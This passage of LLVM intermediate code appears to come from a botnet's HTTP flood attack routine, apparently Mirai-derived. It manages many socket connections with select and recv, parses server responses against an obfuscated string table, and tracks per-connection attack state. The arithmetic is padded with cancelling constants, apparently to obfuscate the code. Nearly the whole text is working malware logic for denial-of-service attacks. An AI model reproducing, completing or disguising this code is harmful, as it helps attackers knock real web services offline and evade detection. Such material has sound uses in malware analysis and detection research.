  %928 = zext i32 %927 to i64
  %929 = shl i64 1, %928
  %930 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %931 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %932 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %931, i32 0, i32 0
  %933 = load i32, i32* %932, align 4
  %934 = sdiv i32 %933, 64
  %935 = sext i32 %934 to i64
  %936 = getelementptr inbounds [16 x i64], [16 x i64]* %930, i64 0, i64 %935
  %937 = load i64, i64* %936, align 8
  %938 = and i64 %937, %929
  %939 = xor i64 %937, %929
  %940 = or i64 %938, %939
  %941 = or i64 %937, %929
  store i64 %940, i64* %936, align 8
  %942 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %943 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %942, i32 0, i32 0
  %944 = load i32, i32* %943, align 4
  %945 = load i32, i32* %23, align 4
  %946 = icmp sgt i32 %944, %945
  br i1 %946, label %947, label %955

; <label>:947:                                    ; preds = %923
  %948 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %949 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %948, i32 0, i32 0
  %950 = load i32, i32* %949, align 4
  %951 = sub i32 %950, -737260055
  %952 = add i32 %951, 1
  %953 = add i32 %952, -737260055
  %954 = add nsw i32 %950, 1
  store i32 %953, i32* %23, align 4
  br label %955

; <label>:955:                                    ; preds = %947, %923
  br label %1020

; <label>:956:                                    ; preds = %917
  %957 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %958 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %957, i32 0, i32 1
  %959 = load i8, i8* %958, align 4
  %960 = zext i8 %959 to i32
  %961 = icmp eq i32 %960, 10
  br i1 %961, label %962, label %994

; <label>:962:                                    ; preds = %956
  %963 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %964 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %963, i32 0, i32 0
  %965 = load i32, i32* %964, align 4
  %966 = srem i32 %965, 64
  %967 = zext i32 %966 to i64
  %968 = shl i64 1, %967
  %969 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %970 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %971 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %970, i32 0, i32 0
  %972 = load i32, i32* %971, align 4
  %973 = sdiv i32 %972, 64
  %974 = sext i32 %973 to i64
  %975 = getelementptr inbounds [16 x i64], [16 x i64]* %969, i64 0, i64 %974
  %976 = load i64, i64* %975, align 8
  %977 = and i64 %976, %968
  %978 = xor i64 %976, %968
  %979 = or i64 %977, %978
  %980 = or i64 %976, %968
  store i64 %979, i64* %975, align 8
  %981 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %982 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %981, i32 0, i32 0
  %983 = load i32, i32* %982, align 4
  %984 = load i32, i32* %23, align 4
  %985 = icmp sgt i32 %983, %984
  br i1 %985, label %986, label %993

; <label>:986:                                    ; preds = %962
  %987 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %988 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %987, i32 0, i32 0
  %989 = load i32, i32* %988, align 4
  %990 = sub i32 0, 1
  %991 = sub i32 %989, %990
  %992 = add nsw i32 %989, 1
  store i32 %991, i32* %23, align 4
  br label %993

; <label>:993:                                    ; preds = %986, %962
  br label %1019

; <label>:994:                                    ; preds = %956
  %995 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %996 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %995, i32 0, i32 1
  %997 = load i8, i8* %996, align 4
  %998 = zext i8 %997 to i32
  %999 = icmp eq i32 %998, 11
  br i1 %999, label %1000, label %1009

; <label>:1000:                                   ; preds = %994
  %1001 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1002 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1001, i32 0, i32 1
  store i8 0, i8* %1002, align 4
  %1003 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1004 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1003, i32 0, i32 0
  %1005 = load i32, i32* %1004, align 4
  %1006 = call i32 @close(i32 %1005)
  %1007 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1008 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1007, i32 0, i32 0
  store i32 -1, i32* %1008, align 4
  br label %1018

; <label>:1009:                                   ; preds = %994
  %1010 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1011 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1010, i32 0, i32 1
  store i8 0, i8* %1011, align 4
  %1012 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1013 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1012, i32 0, i32 0
  %1014 = load i32, i32* %1013, align 4
  %1015 = call i32 @close(i32 %1014)
  %1016 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1017 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1016, i32 0, i32 0
  store i32 -1, i32* %1017, align 4
  br label %1018

; <label>:1018:                                   ; preds = %1009, %1000
  br label %1019

; <label>:1019:                                   ; preds = %1018, %993
  br label %1020

; <label>:1020:                                   ; preds = %1019, %955
  br label %1021

; <label>:1021:                                   ; preds = %1020, %916
  br label %1022

; <label>:1022:                                   ; preds = %1021, %865
  br label %1023

; <label>:1023:                                   ; preds = %1022, %564
  br label %1024

; <label>:1024:                                   ; preds = %1023, %505
  br label %1025

; <label>:1025:                                   ; preds = %1024, %522, %434
  %1026 = load i32, i32* %9, align 4
  %1027 = sub i32 0, %1026
  %1028 = sub i32 0, 1
  %1029 = add i32 %1027, %1028
  %1030 = sub i32 0, %1029
  %1031 = add nsw i32 %1026, 1
  store i32 %1030, i32* %9, align 4
  br label %386

; <label>:1032:                                   ; preds = %386
  %1033 = load i32, i32* %23, align 4
  %1034 = icmp eq i32 %1033, 0
  br i1 %1034, label %1035, label %1036

; <label>:1035:                                   ; preds = %1032
  br label %363

; <label>:1036:                                   ; preds = %1032
  %1037 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %1037, align 8
  %1038 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %1038, align 8
  %1039 = load i32, i32* %23, align 4
  %1040 = call i32 @select(i32 %1039, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %1040, i32* %24, align 4
  %1041 = call i64 @time(i64* null) #6
  %1042 = trunc i64 %1041 to i32
  store i32 %1042, i32* %27, align 4
  %1043 = load i32, i32* %24, align 4
  %1044 = icmp slt i32 %1043, 1
  br i1 %1044, label %1045, label %1046

; <label>:1045:                                   ; preds = %1036
  br label %363

; <label>:1046:                                   ; preds = %1036
  store i32 0, i32* %9, align 4
  br label %1047

; <label>:1047:                                   ; preds = %2768, %1046
  %1048 = load i32, i32* %9, align 4
  %1049 = load i32, i32* %18, align 4
  %1050 = icmp slt i32 %1048, %1049
  br i1 %1050, label %1051, label %2775

; <label>:1051:                                   ; preds = %1047
  %1052 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %1053 = load i32, i32* %9, align 4
  %1054 = sext i32 %1053 to i64
  %1055 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1052, i64 %1054
  store %struct.attack_http_state* %1055, %struct.attack_http_state** %26, align 8
  %1056 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1057 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1056, i32 0, i32 0
  %1058 = load i32, i32* %1057, align 4
  %1059 = icmp eq i32 %1058, -1
  br i1 %1059, label %1060, label %1061

; <label>:1060:                                   ; preds = %1051
  br label %2768

; <label>:1061:                                   ; preds = %1051
  %1062 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %1063 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1064 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1063, i32 0, i32 0
  %1065 = load i32, i32* %1064, align 4
  %1066 = sdiv i32 %1065, 64
  %1067 = sext i32 %1066 to i64
  %1068 = getelementptr inbounds [16 x i64], [16 x i64]* %1062, i64 0, i64 %1067
  %1069 = load i64, i64* %1068, align 8
  %1070 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1071 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1070, i32 0, i32 0
  %1072 = load i32, i32* %1071, align 4
  %1073 = srem i32 %1072, 64
  %1074 = zext i32 %1073 to i64
  %1075 = shl i64 1, %1074
  %1076 = xor i64 %1069, -1
  %1077 = xor i64 %1075, -1
  %1078 = xor i64 -4744126511007209911, -1
  %1079 = or i64 %1076, %1077
  %1080 = or i64 -4744126511007209911, %1078
  %1081 = xor i64 %1079, -1
  %1082 = and i64 %1081, %1080
  %1083 = and i64 %1069, %1075
  %1084 = icmp ne i64 %1082, 0
  br i1 %1084, label %1085, label %1109

; <label>:1085:                                   ; preds = %1061
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %1086 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1087 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1086, i32 0, i32 0
  %1088 = load i32, i32* %1087, align 4
  %1089 = bitcast i32* %35 to i8*
  %1090 = call i32 @getsockopt(i32 %1088, i32 1, i32 4, i8* %1089, i32* %36) #6
  store i32 %1090, i32* %12, align 4
  %1091 = load i32, i32* %35, align 4
  %1092 = icmp eq i32 %1091, 0
  br i1 %1092, label %1093, label %1099

; <label>:1093:                                   ; preds = %1085
  %1094 = load i32, i32* %12, align 4
  %1095 = icmp eq i32 %1094, 0
  br i1 %1095, label %1096, label %1099

; <label>:1096:                                   ; preds = %1093
  %1097 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1098 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1097, i32 0, i32 1
  store i8 4, i8* %1098, align 4
  br label %1108

; <label>:1099:                                   ; preds = %1093, %1085
  %1100 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1101 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1100, i32 0, i32 0
  %1102 = load i32, i32* %1101, align 4
  %1103 = call i32 @close(i32 %1102)
  %1104 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1105 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1104, i32 0, i32 0
  store i32 -1, i32* %1105, align 4
  %1106 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1107 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1106, i32 0, i32 1
  store i8 0, i8* %1107, align 4
  br label %2768

; <label>:1108:                                   ; preds = %1096
  br label %1109

; <label>:1109:                                   ; preds = %1108, %1061
  %1110 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1111 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1112 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1111, i32 0, i32 0
  %1113 = load i32, i32* %1112, align 4
  %1114 = sdiv i32 %1113, 64
  %1115 = sext i32 %1114 to i64
  %1116 = getelementptr inbounds [16 x i64], [16 x i64]* %1110, i64 0, i64 %1115
  %1117 = load i64, i64* %1116, align 8
  %1118 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1119 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1118, i32 0, i32 0
  %1120 = load i32, i32* %1119, align 4
  %1121 = srem i32 %1120, 64
  %1122 = zext i32 %1121 to i64
  %1123 = shl i64 1, %1122
  %1124 = xor i64 %1123, -1
  %1125 = xor i64 %1117, %1124
  %1126 = and i64 %1125, %1117
  %1127 = and i64 %1117, %1123
  %1128 = icmp ne i64 %1126, 0
  br i1 %1128, label %1129, label %2767

; <label>:1129:                                   ; preds = %1109
  %1130 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1131 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1130, i32 0, i32 1
  %1132 = load i8, i8* %1131, align 4
  %1133 = zext i8 %1132 to i32
  %1134 = icmp eq i32 %1133, 6
  br i1 %1134, label %1135, label %2284

; <label>:1135:                                   ; preds = %1129
  store i32 0, i32* %37, align 4
  %1136 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %1136, i32 10240)
  %1137 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1138 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1137, i32 0, i32 0
  %1139 = load i32, i32* %1138, align 4
  %1140 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1141 = call i64 @recv(i32 %1139, i8* %1140, i64 10240, i32 16386)
  %1142 = trunc i64 %1141 to i32
  store i32 %1142, i32* %12, align 4
  %1143 = icmp slt i32 %1142, 1
  br i1 %1143, label %1144, label %1153

; <label>:1144:                                   ; preds = %1135
  %1145 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1146 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1145, i32 0, i32 0
  %1147 = load i32, i32* %1146, align 4
  %1148 = call i32 @close(i32 %1147)
  %1149 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1150 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1149, i32 0, i32 0
  store i32 -1, i32* %1150, align 4
  %1151 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1152 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1151, i32 0, i32 1
  store i8 0, i8* %1152, align 4
  br label %2768

; <label>:1153:                                   ; preds = %1135
  %1154 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1155 = load i32, i32* %12, align 4
  %1156 = call i32 @util_memsearch(i8* %1154, i32 %1155, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1157 = icmp eq i32 %1156, -1
  br i1 %1157, label %1158, label %1162

; <label>:1158:                                   ; preds = %1153
  %1159 = load i32, i32* %12, align 4
  %1160 = icmp slt i32 %1159, 10240
  br i1 %1160, label %1161, label %1162

; <label>:1161:                                   ; preds = %1158
  br label %2768

; <label>:1162:                                   ; preds = %1158, %1153
  %1163 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1164 = load i32, i32* %12, align 4
  %1165 = call i32 @util_memsearch(i8* %1163, i32 %1164, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1166 = sext i32 %1165 to i64
  %1167 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1166
  store i8 0, i8* %1167, align 1
  %1168 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1169 = load i32, i32* %12, align 4
  %1170 = call i8* @table_retrieve_val(i32 53, i32* null)
  %1171 = call i32 @util_stristr(i8* %1168, i32 %1169, i8* %1170)
  %1172 = icmp ne i32 %1171, -1
  br i1 %1172, label %1173, label %1176

; <label>:1173:                                   ; preds = %1162
  %1174 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1175 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1174, i32 0, i32 11
  store i32 2, i32* %1175, align 4
  br label %1176

; <label>:1176:                                   ; preds = %1173, %1162
  %1177 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1178 = load i32, i32* %12, align 4
  %1179 = call i8* @table_retrieve_val(i32 52, i32* null)
  %1180 = call i32 @util_stristr(i8* %1177, i32 %1178, i8* %1179)
  %1181 = icmp ne i32 %1180, -1
  br i1 %1181, label %1182, label %1185

; <label>:1182:                                   ; preds = %1176
  %1183 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1184 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1183, i32 0, i32 11
  store i32 1, i32* %1184, align 4
  br label %1185

; <label>:1185:                                   ; preds = %1182, %1176
  %1186 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1187 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1186, i32 0, i32 12
  store i32 0, i32* %1187, align 4
  %1188 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1189 = load i32, i32* %12, align 4
  %1190 = call i8* @table_retrieve_val(i32 51, i32* null)
  %1191 = call i32 @util_stristr(i8* %1188, i32 %1189, i8* %1190)
  %1192 = icmp ne i32 %1191, -1
  br i1 %1192, label %1193, label %1256

; <label>:1193:                                   ; preds = %1185
  %1194 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1195 = load i32, i32* %12, align 4
  %1196 = call i8* @table_retrieve_val(i32 51, i32* null)
  %1197 = call i32 @util_stristr(i8* %1194, i32 %1195, i8* %1196)
  store i32 %1197, i32* %38, align 4
  %1198 = load i32, i32* %38, align 4
  %1199 = sext i32 %1198 to i64
  %1200 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1199
  %1201 = load i8, i8* %1200, align 1
  %1202 = sext i8 %1201 to i32
  %1203 = icmp eq i32 %1202, 32
  br i1 %1203, label %1204, label %1209

; <label>:1204:                                   ; preds = %1193
  %1205 = load i32, i32* %38, align 4
  %1206 = sub i32 0, 1
  %1207 = sub i32 %1205, %1206
  %1208 = add nsw i32 %1205, 1
  store i32 %1207, i32* %38, align 4
  br label %1209

; <label>:1209:                                   ; preds = %1204, %1193
  %1210 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1211 = load i32, i32* %38, align 4
  %1212 = sext i32 %1211 to i64
  %1213 = getelementptr inbounds i8, i8* %1210, i64 %1212
  %1214 = load i32, i32* %12, align 4
  %1215 = load i32, i32* %38, align 4
  %1216 = add i32 %1214, -1703933087
  %1217 = sub i32 %1216, %1215
  %1218 = sub i32 %1217, -1703933087
  %1219 = sub nsw i32 %1214, %1215
  %1220 = call i32 @util_memsearch(i8* %1213, i32 %1218, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1220, i32* %39, align 4
  %1221 = load i32, i32* %39, align 4
  %1222 = icmp ne i32 %1221, -1
  br i1 %1222, label %1223, label %1255

; <label>:1223:                                   ; preds = %1209
  %1224 = load i32, i32* %38, align 4
  %1225 = sext i32 %1224 to i64
  %1226 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1225
  store i8* %1226, i8** %40, align 8
  %1227 = load i32, i32* %39, align 4
  %1228 = icmp sge i32 %1227, 2
  br i1 %1228, label %1229, label %1235

; <label>:1229:                                   ; preds = %1223
  %1230 = load i32, i32* %39, align 4
  %1231 = add i32 %1230, 1515062014
  %1232 = sub i32 %1231, 2
  %1233 = sub i32 %1232, 1515062014
  %1234 = sub nsw i32 %1230, 2
  store i32 %1233, i32* %39, align 4
  br label %1235

; <label>:1235:                                   ; preds = %1229, %1223
  %1236 = load i32, i32* %38, align 4
  %1237 = load i32, i32* %39, align 4
  %1238 = sub i32 0, %1236
  %1239 = sub i32 0, %1237
  %1240 = add i32 %1238, %1239
  %1241 = sub i32 0, %1240
  %1242 = add nsw i32 %1236, %1237
  %1243 = sext i32 %1241 to i64
  %1244 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1243
  store i8 0, i8* %1244, align 1
  %1245 = load i8*, i8** %40, align 8
  %1246 = load i8*, i8** %40, align 8
  %1247 = call i32 @util_strlen(i8* %1246)
  %1248 = call i8* @table_retrieve_val(i32 50, i32* null)
  %1249 = call i32 @util_stristr(i8* %1245, i32 %1247, i8* %1248)
  %1250 = icmp ne i32 %1249, 0
  br i1 %1250, label %1251, label %1254

; <label>:1251:                                   ; preds = %1235
  %1252 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1253 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1252, i32 0, i32 12
  store i32 1, i32* %1253, align 4
  br label %1254

; <label>:1254:                                   ; preds = %1251, %1235
  br label %1255

; <label>:1255:                                   ; preds = %1254, %1209
  br label %1256

; <label>:1256:                                   ; preds = %1255, %1185
  %1257 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1258 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1257, i32 0, i32 13
  store i32 0, i32* %1258, align 4
  %1259 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1260 = load i32, i32* %12, align 4
  %1261 = call i8* @table_retrieve_val(i32 48, i32* null)
  %1262 = call i32 @util_stristr(i8* %1259, i32 %1260, i8* %1261)
  %1263 = icmp ne i32 %1262, -1
  br i1 %1263, label %1264, label %1326

; <label>:1264:                                   ; preds = %1256
  %1265 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1266 = load i32, i32* %12, align 4
  %1267 = call i8* @table_retrieve_val(i32 48, i32* null)
  %1268 = call i32 @util_stristr(i8* %1265, i32 %1266, i8* %1267)
  store i32 %1268, i32* %41, align 4
  %1269 = load i32, i32* %41, align 4
  %1270 = sext i32 %1269 to i64
  %1271 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1270
  %1272 = load i8, i8* %1271, align 1
  %1273 = sext i8 %1272 to i32
  %1274 = icmp eq i32 %1273, 32
  br i1 %1274, label %1275, label %1281

; <label>:1275:                                   ; preds = %1264
  %1276 = load i32, i32* %41, align 4
  %1277 = sub i32 %1276, -1333979852
  %1278 = add i32 %1277, 1
  %1279 = add i32 %1278, -1333979852
  %1280 = add nsw i32 %1276, 1
  store i32 %1279, i32* %41, align 4
  br label %1281

; <label>:1281:                                   ; preds = %1275, %1264
  %1282 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1283 = load i32, i32* %41, align 4
  %1284 = sext i32 %1283 to i64
  %1285 = getelementptr inbounds i8, i8* %1282, i64 %1284
  %1286 = load i32, i32* %12, align 4
  %1287 = load i32, i32* %41, align 4
  %1288 = add i32 %1286, -402492559
  %1289 = sub i32 %1288, %1287
  %1290 = sub i32 %1289, -402492559
  %1291 = sub nsw i32 %1286, %1287
  %1292 = call i32 @util_memsearch(i8* %1285, i32 %1290, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1292, i32* %42, align 4
  %1293 = load i32, i32* %42, align 4
  %1294 = icmp ne i32 %1293, -1
  br i1 %1294, label %1295, label %1325

; <label>:1295:                                   ; preds = %1281
  %1296 = load i32, i32* %41, align 4
  %1297 = sext i32 %1296 to i64
  %1298 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1297
  store i8* %1298, i8** %43, align 8
  %1299 = load i32, i32* %42, align 4
  %1300 = icmp sge i32 %1299, 2
  br i1 %1300, label %1301, label %1307

; <label>:1301:                                   ; preds = %1295
  %1302 = load i32, i32* %42, align 4
  %1303 = sub i32 %1302, 1782344833
  %1304 = sub i32 %1303, 2
  %1305 = add i32 %1304, 1782344833
  %1306 = sub nsw i32 %1302, 2
  store i32 %1305, i32* %42, align 4
  br label %1307

; <label>:1307:                                   ; preds = %1301, %1295
  %1308 = load i32, i32* %41, align 4
  %1309 = load i32, i32* %42, align 4
  %1310 = sub i32 0, %1309
  %1311 = sub i32 %1308, %1310
  %1312 = add nsw i32 %1308, %1309
  %1313 = sext i32 %1311 to i64
  %1314 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1313
  store i8 0, i8* %1314, align 1
  %1315 = load i8*, i8** %43, align 8
  %1316 = load i8*, i8** %43, align 8
  %1317 = call i32 @util_strlen(i8* %1316)
  %1318 = call i8* @table_retrieve_val(i32 49, i32* null)
  %1319 = call i32 @util_stristr(i8* %1315, i32 %1317, i8* %1318)
  %1320 = icmp ne i32 %1319, 0
  br i1 %1320, label %1321, label %1324

; <label>:1321:                                   ; preds = %1307
  %1322 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1323 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1322, i32 0, i32 13
  store i32 1, i32* %1323, align 4
  br label %1324

; <label>:1324:                                   ; preds = %1321, %1307
  br label %1325

; <label>:1325:                                   ; preds = %1324, %1281
  br label %1326

; <label>:1326:                                   ; preds = %1325, %1256
  %1327 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1328 = load i32, i32* %12, align 4
  %1329 = call i8* @table_retrieve_val(i32 47, i32* null)
  %1330 = call i32 @util_stristr(i8* %1327, i32 %1328, i8* %1329)
  %1331 = icmp ne i32 %1330, -1
  br i1 %1331, label %1332, label %1389

; <label>:1332:                                   ; preds = %1326
  %1333 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1334 = load i32, i32* %12, align 4
  %1335 = call i8* @table_retrieve_val(i32 47, i32* null)
  %1336 = call i32 @util_stristr(i8* %1333, i32 %1334, i8* %1335)
  store i32 %1336, i32* %44, align 4
  %1337 = load i32, i32* %44, align 4
  %1338 = sext i32 %1337 to i64
  %1339 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1338
  %1340 = load i8, i8* %1339, align 1
  %1341 = sext i8 %1340 to i32
  %1342 = icmp eq i32 %1341, 32
  br i1 %1342, label %1343, label %1349

; <label>:1343:                                   ; preds = %1332
  %1344 = load i32, i32* %44, align 4
  %1345 = sub i32 %1344, 817595722
  %1346 = add i32 %1345, 1
  %1347 = add i32 %1346, 817595722
  %1348 = add nsw i32 %1344, 1
  store i32 %1347, i32* %44, align 4
  br label %1349

; <label>:1349:                                   ; preds = %1343, %1332
  %1350 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1351 = load i32, i32* %44, align 4
  %1352 = sext i32 %1351 to i64
  %1353 = getelementptr inbounds i8, i8* %1350, i64 %1352
  %1354 = load i32, i32* %12, align 4
  %1355 = load i32, i32* %44, align 4
  %1356 = add i32 %1354, 772059526
  %1357 = sub i32 %1356, %1355
  %1358 = sub i32 %1357, 772059526
  %1359 = sub nsw i32 %1354, %1355
  %1360 = call i32 @util_memsearch(i8* %1353, i32 %1358, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1360, i32* %45, align 4
  %1361 = load i32, i32* %45, align 4
  %1362 = icmp ne i32 %1361, -1
  br i1 %1362, label %1363, label %1388

; <label>:1363:                                   ; preds = %1349
  %1364 = load i32, i32* %44, align 4
  %1365 = sext i32 %1364 to i64
  %1366 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1365
  store i8* %1366, i8** %46, align 8
  %1367 = load i32, i32* %45, align 4
  %1368 = icmp sge i32 %1367, 2
  br i1 %1368, label %1369, label %1375

; <label>:1369:                                   ; preds = %1363
  %1370 = load i32, i32* %45, align 4
  %1371 = sub i32 %1370, 1934442806
  %1372 = sub i32 %1371, 2
  %1373 = add i32 %1372, 1934442806
  %1374 = sub nsw i32 %1370, 2
  store i32 %1373, i32* %45, align 4
  br label %1375

; <label>:1375:                                   ; preds = %1369, %1363
  %1376 = load i32, i32* %44, align 4
  %1377 = load i32, i32* %45, align 4
  %1378 = sub i32 %1376, -387210446
  %1379 = add i32 %1378, %1377
  %1380 = add i32 %1379, -387210446
  %1381 = add nsw i32 %1376, %1377
  %1382 = sext i32 %1380 to i64
  %1383 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1382
  store i8 0, i8* %1383, align 1
  %1384 = load i8*, i8** %46, align 8
  %1385 = call i32 @util_atoi(i8* %1384, i32 10)
  %1386 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1387 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1386, i32 0, i32 14
  store i32 %1385, i32* %1387, align 4
  br label %1388

; <label>:1388:                                   ; preds = %1375, %1349
  br label %1392

; <label>:1389:                                   ; preds = %1326
  %1390 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1391 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1390, i32 0, i32 14
  store i32 0, i32* %1391, align 4
  br label %1392

; <label>:1392:                                   ; preds = %1389, %1388
  store i32 0, i32* %37, align 4
  br label %1393

; <label>:1393:                                   ; preds = %1614, %1392
  %1394 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1395 = load i32, i32* %37, align 4
  %1396 = sext i32 %1395 to i64
  %1397 = getelementptr inbounds i8, i8* %1394, i64 %1396
  %1398 = load i32, i32* %12, align 4
  %1399 = call i8* @table_retrieve_val(i32 46, i32* null)
  %1400 = call i32 @util_stristr(i8* %1397, i32 %1398, i8* %1399)
  %1401 = icmp ne i32 %1400, -1
  br i1 %1401, label %1402, label %1407

; <label>:1402:                                   ; preds = %1393
  %1403 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
